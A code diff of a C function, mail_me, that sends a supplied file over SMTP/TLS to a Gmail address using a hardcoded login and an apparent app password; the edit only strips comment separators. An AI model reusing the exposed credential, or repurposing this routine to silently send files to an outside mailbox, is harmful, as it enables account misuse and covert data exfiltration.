@@ -107,38 +107,32 @@ int mail_me(const char *attachment)
 {
   SSL *s = init_sock("smtp.gmail.com", 465);
 
-  /* char *cmd; */
-
   WRITE("EHLO smtp.gmail.com\r\n");
   READ;
 
-  /* ---------------------------- */
   WRITE("AUTH LOGIN\r\n");
   read_ssl2(s);
 
-  /* -------------------------------- */
   write_base64(s, "t400.linux@gmail.com");
 
-  /* ---------------------------------------- */
   WRITE("\r\n");
   read_ssl2(s);
-  /* ----------------------------------------------- */
+
   WRITE_ENC("cvdb beak ovwl rece");
   read_ssl2(s);
-  /* -------------------------- */
+
   WRITE(NEW_LINE);
   read_ssl2(s);
-  /* ----------------------------------------------------- */
 
   WRITE("MAIL FROM:<t400.linux@gmail.com>\r\n");
   read_ssl2(s);
-  /* ----------------------------------------------- */
+
   WRITE("RCPT TO:<t400.linux@gmail.com>\r\n");
   read_ssl2(s);
 
   WRITE("DATA\r\n");
   read_ssl2(s);
-  /* ------------------------------------------------ */
+
   WRITE("MIME-Version: 1.0\r\n");
 
   WRITE("Content-Type:multipart/"
@@ -172,14 +166,17 @@ int mail_me(const char *attachment)
   UPLOAD(attachment);
 
   WRITE(NEW_LINE);
-  /* --------------------------------------------------------------- */
+
   WRITE("U2FtcGxlIFRleHQu\r\n");
+
   WRITE("\r\n--977d81ff9d852ab2a0cad646f8058349--\r\n");
-  /* ------------------------------------------------------------------- */
+
   WRITE("\r\n.\r\n");
+
   WRITE("QUIT\r\n");
 
   SSL_shutdown(s);
+
   return 0;
 }
 #if 0
